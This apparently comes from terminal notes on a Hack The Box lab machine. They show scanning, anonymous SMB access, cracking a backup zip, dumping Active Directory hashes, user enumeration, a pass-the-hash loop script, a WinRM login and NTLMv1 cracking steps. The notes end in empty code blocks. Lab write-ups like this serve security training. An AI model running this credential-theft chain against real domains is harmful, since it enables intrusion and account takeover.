53,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49680,49688┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ sudo nmap  -6 --min-rate 10000 -p- dead:beef::8581:ea2c:ca5e:aa12 -oA Nmap/ports_ipv6
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-24 03:51 -0400
Nmap scan report for dead:beef::8581:ea2c:ca5e:aa12
Host is up (0.14s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49680/tcp open  unknown
49688/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.93 seconds
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ grep open Nmap/ports_ipv6.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49680,49688
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ smbclient -L \\\dead:beef::8581:ea2c:ca5e:aa12 -N                                                                                
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        backup          Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
dead:beef::8581:ea2c:ca5e:aa12 is an IPv6 address -- no workgroup available
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT]                                                                                                                                                                                 
└─$ smbclient //dead:beef::8581:ea2c:ca5e:aa12/backup                                                                                                                                                             
Password for [WORKGROUP\kali]:                                                                                                                                                                                    
Anonymous login successful                                                                                                                                                                                        
Try "help" to get a list of possible commands.                                                                                                                                                                    
smb: \> ls                                                                                                                                                                                                        
  .                                   D        0  Thu Sep 24 03:30:52 2020                                                                                                                                        
  ..                                  D        0  Thu Sep 24 03:30:52 2020                                                                                                                                        
  backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020                                                                                                                                        
                                                                                                                                                                                                                  
                5114623 blocks of size 4096. 2633512 blocks available                                                                                                                                             
smb: \> prompt                                                                                                                                                                                                    
smb: \> mget backup.zip                                                                                  
getting file \backup.zip of size 10650961 as backup.zip (562.7 KiloBytes/sec) (average 562.7 KiloBytes/sec)
smb: \>  ^C
         
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ file backup.zip                                           
backup.zip: Zip archive data, at least v2.0 to extract, compression method=store
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ unzip -l backup.zip 
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2020-09-23 19:40   Active Directory/
 50331648  2020-09-23 19:38   Active Directory/ntds.dit
    16384  2020-09-23 19:38   Active Directory/ntds.jfm
        0  2020-09-23 19:40   registry/
   262144  2020-09-23 19:22   registry/SECURITY
 12582912  2020-09-23 19:22   registry/SYSTEM
---------                     -------
 63193088                     6 files
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ unzip backup.zip   
Archive:  backup.zip
   creating: Active Directory/
[backup.zip] Active Directory/ntds.dit password: 
   skipping: Active Directory/ntds.dit  incorrect password
   skipping: Active Directory/ntds.jfm  incorrect password
   creating: registry/
   skipping: registry/SECURITY       incorrect password
   skipping: registry/SYSTEM         incorrect password

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ zip2john backup.zip > backup_hash.txt
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 type=8
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785 ts=9CCA cs=2a39 type=8
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3 ts=9AC6 cs=9beb type=8
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD ts=9AC6 cs=65d9 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ john backup_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)     
1g 0:00:00:00 DONE (2026-04-24 05:10) 50.00g/s 819200p/s 819200c/s 819200C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ unzip backup.zip 
Archive:  backup.zip
   creating: Active Directory/
[backup.zip] Active Directory/ntds.dit password: 
  inflating: Active Directory/ntds.dit  
  inflating: Active Directory/ntds.jfm  
   creating: registry/
  inflating: registry/SECURITY       
  inflating: registry/SYSTEM         
                                                                                                                                                                
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ cd Active\ Directory                                                  
┌──(kali㉿kali)-[~/…/Kali/APT/backup/Active Directory]
└─$ ls -liah 
total 49M
2774818 drwxrwxr-x 2 kali kali 4.0K Sep 23  2020 .
2774815 drwxrwxr-x 4 kali kali 4.0K Apr 24 05:10 ..
2774865 -rw-rw-r-- 1 kali kali  48M Sep 23  2020 ntds.dit
2774879 -rw-rw-r-- 1 kali kali  16K Sep 23  2020 ntds.jfm


```

```bash
┌──(kali㉿kali)-[~/…/Kali/APT/backup/Active Directory]
└─$ impacket-secretsdump -ntds ntds.dit -system ../registry/SYSTEM LOCAL | tee ../user_hash_ra
...
...

┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ cat user_hash_raw | wc -l
8005
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ cat user_hash_raw| grep ':::' |awk -F ':' '{print $1}' | sort -u | tee user_list.txt
...
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ cat user_hash_raw| grep ':::' |awk -F ':' '{print $3,$4}' | sed 's/ /:/g' | tee user_hash.txt
...
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ ldapsearch -x -H "ldap://[dead:beef::15c]" -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ sudo bash -c 'echo "dead:beef::8581:ea2c:ca5e:aa12 htb.local" >> /etc/hosts'
[sudo] password for kali: 
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ tail -n 1 /etc/hosts
dead:beef::8581:ea2c:ca5e:aa12 htb.local
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ ./kerbrute userenum -d htb.local --dc htb.local user_list.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/24/26 - Ronnie Flathers @ropnop

2026/04/24 05:41:56 >  Using KDC(s):
2026/04/24 05:41:56 >   htb.local:88

2026/04/24 05:42:07 >  [+] VALID USERNAME:       Administrator@htb.local
2026/04/24 05:43:16 >  [+] VALID USERNAME:       APT$@htb.local
2026/04/24 05:46:08 >  [!] clem.parks@htb.local - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error sneding to htb.local:88: sending over UDP failed to [dead:beef::8581:ea2c:ca5e:aa12]:88: read udp [dead:beef:4::1038]:38870->[dead:beef::8581:ea2c:ca5e:aa12]:88: i/o timeout) and then TCP (error in getting a TCP connection to any of the KDCs)
2026/04/24 05:46:08 >  [!] clifton.lindsay@htb.local - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error sneding to htb.local:88: sending over UDP failed to [dead:beef::8581:ea2c:ca5e:aa12]:88: read udp [dead:beef:4::1038]:53917->[dead:beef::8581:ea2c:ca5e:aa12]:88: i/o timeout) and then TCP (error in getting a TCP connection to any of the KDCs)
2026/04/24 05:46:08 >  [!] clotilda.poole@htb.local - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error sneding to htb.local:88: sending over UDP failed to [dead:beef::8581:ea2c:ca5e:aa12]:88: read udp [dead:beef:4::1038]:43970->[dead:beef::8581:ea2c:ca5e:aa12]:88: i/o timeout) and then TCP (error in getting a TCP connection to any of the KDCs)
2026/04/24 05:46:08 >  [!] clive.holman@htb.local - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error sneding to htb.local:88: sending over UDP failed to [dead:beef::8581:ea2c:ca5e:aa12]:88: read udp [dead:beef:4::1038]:34316->[dead:beef::8581:ea2c:ca5e:aa12]:88: i/o timeout) and then TCP (error in getting a TCP connection to any of the KDCs)
2026/04/24 05:46:19 >  Done! Tested 441 usernames (2 valid) in 261.922 seconds
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ vim users.txt    
                                                                                                                               
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ cat users.txt    
Administrator
APT$
henry.vinson
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ ./kerbrute userenum -d htb.local --dc htb.local user_list.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/24/26 - Ronnie Flathers @ropnop

2026/04/24 07:36:01 >  Using KDC(s):
2026/04/24 07:36:01 >   htb.local:88

2026/04/24 07:36:12 >  [+] VALID USERNAME:       Administrator@htb.local
2026/04/24 07:37:16 >  [+] VALID USERNAME:       APT$@htb.local
2026/04/24 07:43:34 >  [+] VALID USERNAME:       henry.vinson@htb.local
2026/04/24 07:53:46 >  Done! Tested 2000 usernames (3 valid) in 1064.577 seconds
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT/backup]
└─$ cat getTGT.sh    
#!/bin/bash

while IFS='' read -r LINE || [ -n "${LINE}" ]
do
        echo "*************"
        echo "Hash:${LINE}"
        /usr/share/doc/python3-impacket/examples/getTGT.py htb.local/henry.vinson@htb.local -hashes ${LINE}
done < user_hash.txt
```

```bash
*************
Hash:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in henry.vinson@htb.local.ccache

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ nxc winrm htb.local -u henry.vinson_adm -p 'G1#Ny5@2dvht'
WINRM       dead:beef::b885:d62a:d679:573f 5985   APT              [*] Windows 10 / Server 2016 Build 14393 (name:APT) (domain:htb.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       dead:beef::b885:d62a:d679:573f 5985   APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht (Pwn3d!)
```

```bash
┌──(.venv)─(kali㉿kali)-[~/Work/Kali/APT]
└─$ python3 ntlmv1.py --ntlmv1 'APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788'
Hashfield Split:
['APT$', '', 'HTB', '95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384', '95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384', '1122334455667788']

Hostname: HTB
Username: APT$
Challenge: 1122334455667788
LM Response: 95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
NT Response: 95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
CT1: 95ACA8C7248774CB
CT2: 427E1AE5B8D5CE68
CT3: 30A49B5BB858D384

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin 30A49B5BB858D384 1122334455667788

To crack with hashcat create a file with the following contents:
95ACA8C7248774CB:1122334455667788
427E1AE5B8D5CE68:1122334455667788

echo "95ACA8C7248774CB:1122334455667788">>14000.hash
echo "427E1AE5B8D5CE68:1122334455667788">>14000.hash

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1

Once complete run output through deskey_to_ntlm.pl

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```